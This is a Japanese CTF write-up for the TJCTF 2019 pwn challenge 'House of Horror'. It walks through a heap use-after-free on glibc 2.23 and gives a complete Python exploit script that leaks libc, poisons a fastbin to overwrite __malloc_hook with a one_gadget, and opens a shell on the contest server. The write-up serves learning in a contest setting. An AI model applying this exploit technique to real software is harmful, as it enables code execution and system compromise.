# [pwn 130pts] House of Horror - TJCTF 2019
PIE以外有効です。
```
$ checksec -f house_of_horror
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      Yes	0		1	house_of_horror
```

配列を作ったり消したり編集したり見たりできるヒープ系問題です。
サイズを指定すると`(size + 1) * 8`バイトだけmallocされます。
配列は最大で15個まで作れます。
また、配列の先頭にはサイズが入り、8バイト目から配列データが始まります。
削除した後にarray_listにNULLを入れていなのでUAFがあります。
libcのバージョンは2.23なのでfastbinで頑張らなきゃダメです。

サイズが自由なのでまずはunsorted binを使ってlibcのアドレスを取得しましょう。
```python
# libc leak
create_array(0x90 // 8) # 0
create_array(0x10 // 8) # 1
create_array(0x10 // 8) # 2
delete_array(0)
libc_base = int(view_element(0, 0), 10) - main_arena - delta
logger.info("libc base = " + hex(libc_base))
```

次にfastbinのリンクを偽装したいのですが、最初の要素はサイズとして使われており変更できません。
そこで、free済みチャンクのサイズが非常に大きな値になることを利用して、次のチャンクの先頭を`__malloc_hook`の場所に変更してやります。

```python
from ptrlib import *
import ctypes

def create_array(size):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("> ", str(size))

def delete_array(index):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter("> ", str(index))

def view_element(index, offset):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter("> ", str(index))
    sock.sendlineafter("> ", str(offset))
    return sock.recvline().rstrip()

def edit_element(index, offset, value):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter("> ", str(index))
    sock.sendlineafter("> ", str(offset))
    sock.sendlineafter("> ", str(value))

libc = ELF("./libc.so.6")
sock = Socket("p1.tjctf.org", 8001)
#sock = Socket("127.0.0.1", 9999)
main_arena = 0x3c4b20
delta = 0x58
one_gadget = 0xf1147

# libc leak
create_array(0x90 // 8) # 0
create_array(0x60 // 8) # 1
create_array(0x60 // 8) # 2
create_array(0x60 // 8) # 3
delete_array(0)
libc_base = int(view_element(0, 0), 10) - main_arena - delta
logger.info("libc base = " + hex(libc_base))

# overwrite __malloc_hook
delete_array(1)
delete_array(2)
delete_array(3)
# fastbin->3->2->1
edit_element(2, 0x68 // 8, libc_base + libc.symbol("__malloc_hook") - 27 - 8)
# fastbin->3->__malloc_hook-35
create_array(0x60 // 8) # 4
create_array(0x60 // 8) # 5
target = libc_base + one_gadget
edit_element(5, 1, ctypes.c_longlong((target & 0xFFFFFFFFFF) << 24).value)
edit_element(5, 2, target >> 40)

# get the shell!
create_array(0x10 // 8)

sock.interactive()
```

できたー。
```
$ python solve.py 
[+] __init__: Successfully connected to p1.tjctf.org:8001
[+] <module>: libc base = 0x7ff016b6e000
[ptrlib]$ ls
[ptrlib]$ flag.txt
house_of_horror
libc.so.6
wrapper
cat flag.txt
[ptrlib]$ 
tjctf{tfw_u_accidentally_leave_fastbins_in_the_binary}[ptrlib]$
```

# 感想
この手の問題はだいぶ慣れてきました。
